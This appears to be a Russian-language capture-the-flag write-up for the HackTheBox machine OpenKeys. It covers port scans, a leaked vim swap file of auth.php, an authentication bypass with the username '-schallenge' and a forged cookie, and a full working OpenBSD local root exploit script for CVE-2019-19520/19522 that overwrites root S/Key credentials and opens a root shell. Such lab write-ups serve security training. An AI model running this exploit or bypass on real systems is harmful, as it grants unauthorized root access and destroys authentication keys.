# OpenKeys
## HTB machine

- Название: OpenKeys  
- OS: OpenBSD
- Ресурс: HackTheBox
- Сложность: Easy
- Дата релиза: 25.07.20

## Write-up

```html
┌─[user@parrot-virtual]─[~/Downloads]
└──╼ $nmap -sC -sV 10.10.10.199
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 17:16 BST
Nmap scan report for 10.10.10.199
Host is up (0.076s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.00 seconds
```

```html
┌─[user@parrot-virtual]─[~/Downloads]
└──╼ $gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://10.10.10.199/ -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.199/
[+] Threads:        50
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/18 17:21:46 Starting gobuster
===============================================================
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/vendor (Status: 301)
===============================================================
2020/08/18 17:22:07 Finished
===============================================================
```

>http://10.10.10.199/includes/auth.php.swp

```html
┌─[user@parrot-virtual]─[~/Downloads]
└──╼ $cat auth.php.swp 
3210#"! Utp=ad���enniferopenkeys.htb/var/www/htdocs/includes/auth.php
�����sWB@?" �������mgC�
 �
  �
   �
    �
     �
      �
       v
        p
         n
          m
           U
            S
             0
              �
               �
                �
                 J



                  �
�
�
�
�
�
�
�
�
�
�
?>}    session_start();    session_destroy();    session_unset();{function close_session()}    $_SESSION["username"] = $_REQUEST['username'];    $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];    $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];    $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];    $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];    $_SESSION["logged_in"] = True;{function init_session()}    }        return False;    {    else    }        }            return True;            $_SESSION['last_activity'] = $time;            // Session is active, update last activity time and return True        {        else        }            return False;            close_session();        {            ($time - $_SESSION['last_activity']) > $session_timeout)        if (isset($_SESSION['last_activity']) &&         $time = $_SERVER['REQUEST_TIME'];        // Has the session expired?    {    if(isset($_SESSION["logged_in"]))    // Is the user logged in?     session_start();    // Start the session    $session_timeout = 300;    // Session timeout in seconds{function is_active_session()}    return $retcode;    system($cmd, $retcode);    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);{function authenticate($username, $password)?php
```

```html
┌─[✗]─[user@parrot-virtual]─[~/Downloads]
└──╼ $strings auth.php.swp 
b0VIM 8.1
jennifer
openkeys.htb
/var/www/htdocs/includes/auth.php
3210
#"! 
    session_start();
    session_destroy();
    session_unset();
function close_session()
    $_SESSION["username"] = $_REQUEST['username'];
    $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
    $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["logged_in"] = True;
function init_session()
    }
        return False;
    {
    else
    }
        }
            return True;
            $_SESSION['last_activity'] = $time;
            // Session is active, update last activity time and return True
        {
        else
        }
            return False;
            close_session();
        {
            ($time - $_SESSION['last_activity']) > $session_timeout)
        if (isset($_SESSION['last_activity']) && 
        $time = $_SERVER['REQUEST_TIME'];
        // Has the session expired?
    {
    if(isset($_SESSION["logged_in"]))
    // Is the user logged in? 
    session_start();
    // Start the session
    $session_timeout = 300;
    // Session timeout in seconds
function is_active_session()
    return $retcode;
    system($cmd, $retcode);
    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
function authenticate($username, $password)
?php
```

>http://10.10.10.199/auth_helpers/check_auth

```html
┌─[user@parrot-virtual]─[~/Downloads]
└──╼ $strings check_auth 
/usr/libexec/ld.so
OpenBSD
libc.so.95.1
_csu_finish
exit
_Jv_RegisterClasses
atexit
auth_userokay
_end
AWAVAUATSH
t-E1
t7E1
ASAWAVAT
A\A^A_A[]
ASAWAVP
A^A_A[]L3
Linker: LLD 8.0.1
.interp
.note.openbsd.ident
.dynsym
.gnu.hash
.hash
.dynstr
.rela.dyn
.rela.plt
.eh_frame_hdr
.eh_frame
.text
.init
.fini
.plt
.data
.openbsd.randomdata
.jcr
.ctors
.dtors
.dynamic
.got
.got.plt
.bss
.comment
.symtab
.shstrtab
.strtab
crt0.c
___start
crtbegin.c
__CTOR_LIST__
__DTOR_LIST__
__EH_FRAME_BEGIN__
__JCR_LIST__
__do_fini
__do_fini.finalized
__do_init
__do_init.initialized
__do_init.object
test.c
crtend.c
__csu_do_fini_array
__init
__init_array_end
__init_array_start
__llvm_retpoline_r11
__preinit_array_end
__preinit_array_start
__retguard_1205
__start
_csu_finish
_start
exit
main
_Jv_RegisterClasses
__dso_handle
__fini
__fini_array_end
__fini_array_start
__guard_local
__register_frame_info
__retguard_1471
__retguard_1773
__retguard_2473
atexit
_GLOBAL_OFFSET_TABLE_
auth_userokay
_end
_DYNAMIC
```

>https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/

```html
user - "-schallenge"
pass - any
```

>Создаем новые куки name - "username" value - "jennifer"

```html
┌─[user@parrot-virtual]─[~/Downloads]
└──╼ $ssh -i id_rsa jennifer@10.10.10.199
The authenticity of host '10.10.10.199 (10.10.10.199)' can't be established.
ECDSA key fingerprint is SHA256:gzhq4BokiWZ1NNWrblA8w3hLOhlhoRy+NFyi2smBZOA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.199' (ECDSA) to the list of known hosts.
Last login: Tue Aug 18 13:39:09 2020 from 10.10.14.114
OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

openkeys$ ls
user.txt
openkeys$ cat user.txt                                                                        
36ab21239a15c537bde906**********
```

```html
openkeys$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/sudo
/usr/local/bin/check_auth
/usr/bin/chfn
/usr/bin/chpass
/usr/bin/chsh
/usr/bin/doas
/usr/bin/lpr
/usr/bin/lprm
/usr/bin/passwd
/usr/bin/su
/usr/libexec/lockspool
/usr/libexec/ssh-keysign
/usr/sbin/authpf
/usr/sbin/authpf-noip
/usr/sbin/pppd
/usr/sbin/traceroute
/usr/sbin/traceroute6
/sbin/ping
/sbin/ping6
/sbin/shutdown
```

>https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot

```html
openkeys$ cd tmp/
openkeys$ nano openbsd-authroot


#!/bin/sh
# openbsd-authroot - OpenBSD local root exploit for CVE-2019-19520 and CVE-2019-19522
# Code mostly stolen from Qualys PoCs:
# - https://www.openwall.com/lists/oss-security/2019/12/04/5
#
# Uses CVE-2019-19520 to gain 'auth' group permissions via xlock;
# and CVE-2019-19520 to gain root permissions via S/Key or YubiKey
# (requires S/Key or YubiKey authentication to be enabled).
# ---
# $ ./openbsd-authroot
# openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
# [*] checking system ...
# [*] system supports YubiKey authentication
# [*] id: uid=1002(test) gid=1002(test) groups=1002(test)
# [*] compiling ...
# [*] running Xvfb ...
# [*] testing for CVE-2019-19520 ...
# (EE) 
# Fatal server error:
# (EE) Server is already active for display 66
#         If this server is no longer running, remove /tmp/.X66-lock
#         and start again.
# (EE) 
# [+] success! we have auth group permissions
#
# WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).
#
# [*] trying CVE-2019-19522 (YubiKey) ...
# Your password is: krkhgtuhdnjclrikikklulkldlutreul
# Password:
# ksh: /etc/profile[2]: source: not found
# # id                                                                                                                                                                                    
# uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
# ---
# 2019-12-06 - bcoles@gmail.com
# https://github.com/bcoles/local-exploits/tree/master/CVE-2019-19520

echo "openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)"

echo "[*] checking system ..."

if grep auth= /etc/login.conf | fgrep -Ev "^#" | grep -q yubikey ; then
  echo "[*] system supports YubiKey authentication"
  target='yubikey'
elif grep auth= /etc/login.conf | fgrep -Ev "^#" | grep -q skey ; then
  echo "[*] system supports S/Key authentication"
  target='skey'
  if ! test -d /etc/skey/ ; then
    echo "[-] S/Key authentication enabled, but has not been initialized"
    exit 1
  fi
else
  echo "[-] system does not support S/Key / YubiKey authentication"
  exit 1
fi

echo "[*] id: `id`"

echo "[*] compiling ..."

cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>
static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);
    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

cc -fpic -shared -s -o swrast_dri.so swrast_dri.c
rm -rf swrast_dri.c

echo "[*] running Xvfb ..."

display=":66"

env -i /usr/X11R6/bin/Xvfb $display -cc 0 &

echo "[*] testing for CVE-2019-19520 ..."

group=$(echo id -gn | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display)

if [ "$group" = "auth" ]; then
  echo "[+] success! we have auth group permissions"
else
  echo "[-] failed to acquire auth group permissions"
  exit 1
fi

# uncomment to drop to a shell with auth group permissions
#env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display ; exit

echo
echo "WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C)."
echo
sleep 5

if [ "$target" = "skey" ]; then
  echo "[*] trying CVE-2019-19522 (S/Key) ..."
  echo "rm -rf /etc/skey/root ; echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root ; chmod 0600 /etc/skey/root" | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display
  rm -rf swrast_dri.so
  echo "Your password is: EGG LARD GROW HOG DRAG LAIN"
  env -i TERM=vt220 su -l -a skey
fi

if [ "$target" = "yubikey" ]; then
  echo "[*] trying CVE-2019-19522 (YubiKey) ..."
  echo "rm -rf /var/db/yubikey/root.* ; echo 32d32ddfb7d5 > /var/db/yubikey/root.uid ; echo 554d5eedfd75fb96cc74d52609505216 > /var/db/yubikey/root.key" | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display
  rm -rf swrast_dri.so
  echo "Your password is: krkhgtuhdnjclrikikklulkldlutreul"
  env -i TERM=vt220 su -l -a yubikey
fi
```

```html
openkeys$ chmod +x ./openbsd-authroot
openkeys$ ./openbsd-authroot
openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
[*] checking system ...
[*] system supports S/Key authentication
[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
[*] compiling ...
[*] running Xvfb ...
[*] testing for CVE-2019-19520 ...
_XSERVTransmkdir: ERROR: euid != 0,directory /tmp/.X11-unix will not be created.
[+] success! we have auth group permissions

WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

[*] trying CVE-2019-19522 (S/Key) ...
Your password is: EGG LARD GROW HOG DRAG LAIN
otp-md5 99 obsd91335
S/Key Password:
openkeys# id                                                                            
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
openkeys# ls
.Xdefaults  .cshrc      .forward    .profile    .viminfo    root.txt
.composer   .cvsrc      .login      .ssh        dead.letter
openkeys# cat root.txt                                                                        
f3a553b1697050ae885e7c**********
```

